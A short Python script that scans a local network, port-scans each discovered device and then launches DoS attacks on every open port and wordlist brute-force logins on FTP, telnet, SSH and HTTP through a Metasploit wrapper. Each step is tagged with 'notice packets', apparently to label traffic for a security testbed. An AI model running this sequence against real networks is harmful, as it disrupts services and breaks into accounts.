from scanner import Scanner
from packet import AttackNoticePackets
from metasploit import Metasploit

scanner = Scanner(initial_scan=False)
# For the host scan the notice packets are send to the access point
with AttackNoticePackets("hostscan", "192.168.12.1"):
    scanner.search_hosts()


connected_ips = [(host.ip, host.mac) for host in scanner.hosts if host.mac]
print(f"Found connected devices with these ip addresses: {connected_ips}")

metasploit = Metasploit()
for connected_ip in connected_ips:
    with AttackNoticePackets("tcp_portscan", connected_ip[0], connected_ip[1]):
        ports = metasploit.tcp_portscan_attack(connected_ip[0])

    for port in ports:
        with AttackNoticePackets("dos", connected_ip[0], connected_ip[1]):
            metasploit.dos_attack(connected_ip[0], port)

    with AttackNoticePackets("ftp_wordlist", connected_ip[0], connected_ip[1]):
        metasploit.brute_force_login(connected_ip[0], 'ftp')

    with AttackNoticePackets("telnet_wordlist", connected_ip[0], connected_ip[1]):
        metasploit.brute_force_login(connected_ip[0], 'telnet')

    with AttackNoticePackets("ssh_wordlist", connected_ip[0], connected_ip[1]):
        metasploit.brute_force_login(connected_ip[0], 'ssh')

    with AttackNoticePackets("http_wordlist", connected_ip[0], connected_ip[1]):
        metasploit.brute_force_login(connected_ip[0], 'http')
